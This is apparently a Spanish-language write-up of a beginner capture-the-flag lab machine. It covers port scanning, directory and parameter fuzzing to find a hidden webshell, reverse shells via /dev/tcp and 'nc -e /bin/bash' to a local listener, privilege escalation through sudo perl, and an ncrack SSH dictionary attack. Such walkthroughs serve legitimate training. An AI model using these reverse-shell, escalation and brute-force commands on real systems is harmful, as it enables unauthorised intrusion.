<p>En esta maquina facil nos encontramos con enumeracion , fuzzing , fuerza bruta , reverse shell</p>

<p><img src="assets/img_hidden/hidden.png" alt="portada" /></p>

<h2 id="herramientas-y-software-utilizado">Herramientas y software utilizado</h2>

<ul>
  <li>arp-scan</li>
  <li>nmap</li>
  <li>gobuster , wfuzz</li>
  <li>sudo</li>
  <li>python3 http.server</li>
  <li>ncrack</li>
</ul>

<p>Una vez encontrada la maquina realizamos un scan de puertos con nmap</p>

<p><img src="assets/img_hidden/nmap.png" alt="nmap" /></p>

<p>Como vemos en este caso solo tenemos el puerto 22 y el 80 asi que primero vamos a ver la web y su codigo fuente.</p>

<p><img src="assets/img_hidden/web1.png" alt="web1" /></p>

<p>En la web nos encontramos  con una imagen con un codigo extraño y su nombre indica que lo decodifiquemos y mas abajo en un comentario nos indica que ese codigo usa un formato concreto.</p>

<p><img src="assets/img_hidden/code_level1.png" alt="code_level1" /></p>

<p>Nos vamos a la siguiente web https://www.dcode.fr/tic-tac-toe-cipher y buscamos la codificacion correcta para nuestro codigo para poder obtener algo legible.</p>

<p><img src="assets/img_hidden/level1.png" alt="level1" /></p>

<blockquote>
  <p>¿Cuál es la diferencia entre codificar y cifrar?
Los códigos por lo general operan sobre la semántica, significados, mientras que los cifrados operan sobre la sintaxis, símbolos. 
Un código se almacena como un mapeo en un libro de códigos, mientras que los cifrados transforman símbolos individuales de acuerdo con un algoritmo.</p>
</blockquote>

<p>Una vez localizado y decodeado lo añadimos a /etc/hosts vamos a la web de nuevo a ver que hay.</p>

<p><img src="assets/img_hidden/etc_hosts.png" alt="etc_hosts" /></p>

<p><img src="assets/img_hidden/level2.png" alt="level2" /></p>

<p>Como vemos no hay nada util asi que toca hacer fuzzing contra la ruta añadida en etc/hosts para buscar directorios y archivos ocultos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nt">-q</span> <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> html,htm,php,txt,xml <span class="nt">-u</span> http://sys.hidden.hmv <span class="nt">--exclude-length</span> 3690
</code></pre></div></div>

<p><img src="assets/img_hidden/gobuster.png" alt="gobuster" /></p>

<p>Como vemos nos muestra tres directorios ocultos dos de ellos son para distraernos y uno de ellos nos devuelve una web en blanco.</p>

<p>Vamos a hacer fuzzing de nuevo contra ese otro directorio para ver si esconde algo mas.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nt">-q</span> <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> html,htm,php,txt,xml <span class="nt">-u</span> http://sys.hidden.hmv/weapon <span class="nt">--exclude-length</span> 3690
</code></pre></div></div>
<p><img src="assets/img_hidden/level_weapon.png" alt="level_weapon" /></p>

<p>Nos encuentra un archivo con nombre loot.php al que tenemos acceso pero nos devuelve una web en blanco , me hace pensar que hay una webshell , pero nos faltan datos para hacer uso de ella si es que existe .</p>

<p>Esta vez neceitamos encontrar la carga que falta para poder ejecutar comandos y vamos a hacer uso de otro fuzzer en este caso wfuzz para ver si encuentra la carga util que nos faltaria.</p>

<blockquote>
  <p>Las webshell siempre tienen este fomato:
htttp:direccion/archivo.php?loquesea=comando
Al menos por lo que he visto hasta la fecha pero imagino que pueden crearse con otro lenguaje.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/dirb/wordlists/big.txt  <span class="nt">-u</span> http://sys.hidden.hmv/weapon/loot.php<span class="se">\?</span>FUZZ<span class="se">\=</span><span class="nb">ls</span> <span class="nt">--hw</span> 0
</code></pre></div></div>

<p><img src="assets/img_hidden/wfuzz_rce.png" alt="wfuzz_rce" /></p>

<p><img src="assets/img_hidden/web_rce_ok.png" alt="web_rce_ok" /></p>

<p>Como vemos en la imagen y despues de varias pruebas con otros fuzzers encontro la palabrita que nos da paso a la ejecucion de comandos remota , es momento de mandarnos una reverseshell.</p>

<p>Para ello podemos buscar en internet hay varias paginas que te la crean yo uso la siguiente https://www.revshells.com/.</p>

<p>Lo primero es poner nuestra maquina a la escucha:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvpn</span> 9001
</code></pre></div></div>

<p>Despues en la webshell ejecutamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/192.168.0.112/9001 0&gt;&amp;1
</code></pre></div></div>

<p>Este intento no me conecto ni encodeando la url acto seguido hago lo mismo pero llamando a nc directamente.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 20192.168.0.112 9001 <span class="nt">-e</span> sh
</code></pre></div></div>

<p>Con este segundo metodo tampoco me conectaba como esperaba pueden ver el error en la imagen de abajo al igual que la conexion exitosa cuando cambie el sh por un /bin/bash quedando el comando de la siguiente manera.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 20192.168.0.112 9001 <span class="nt">-e</span> /bin/bash
</code></pre></div></div>

<p><img src="assets/img_hidden/nc_errors_ok.png" alt="nc_errors_ok.png" /></p>

<p>Spanw de shell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
</code></pre></div></div>

<p>Aqui podemos ver el fichero que creo para verificar que la carga util era la palabra hack que por lo general usan cmd , exec , etc….</p>

<p><img src="assets/img_hidden/contenido_loop.png" alt="loop" /></p>

<p>Ahora como siempre lo primero sera un sudo -l o permisos suid con find para algun binario o script personal.</p>

<p><img src="assets/img_hidden/sudo-l_toreto.png" alt="sudo-ltoreto" /></p>

<p>Al hacer un ls sobre el home vemos que hay dos usuario toreto y atenea y el usuario toreto puede ejcutar perl con permisos sudo . 
Vamos a gtofbins para ver como se hace y poder acceder al sistema de ficheros de toreto conservando sus privilegios.</p>

<blockquote>
  <p>Recordar que sois www-data hay que indicarle a sudo con el usuario que quereis ejecutar sudo.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> toreto perl <span class="nt">-e</span> <span class="s1">'exec "/bin/bash" ;'</span>
</code></pre></div></div>

<p><img src="assets/img_hidden/acceso_toreto.png" alt="acceso_toreto" /></p>

<p>El usuario toreto no tiene nada interesante revisamos el user atenea y encontramos una carpeta oculta con un diccionario de claves , debemos descargarlo y lanzar cualquier software que permita ataque por diccionario.
Para ello levanto un servicio web con python en el directorio</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server
</code></pre></div></div>

<p>Descargamos el diccionario y lanzamos en mi caso ncrack</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncrack <span class="nt">-p</span> 22 <span class="nt">--user</span> atenea <span class="nt">-P</span> atenea.txt 192.168.0.101
</code></pre></div></div>

<p><img src="assets/img_hidden/ncrack.png" alt="ncrak" /></p>

<p>Nos logueamos por ssh con el user y la pass y empezmos la escala final como antes con sudo -l.</p>

<p><img src="assets/img_hidden/login_atenea.png" alt="login_atenea" /></p>

<p><img src="assets/img_hidden/sudo_atenea.png" alt="sudo_atenea" /></p>

<p>Consultamos gtofbins para ver como se hace la escala con socat.</p>

<p>Para variar no olviden buscar las flags</p>

<p>Muchas gracias por leer.</p>
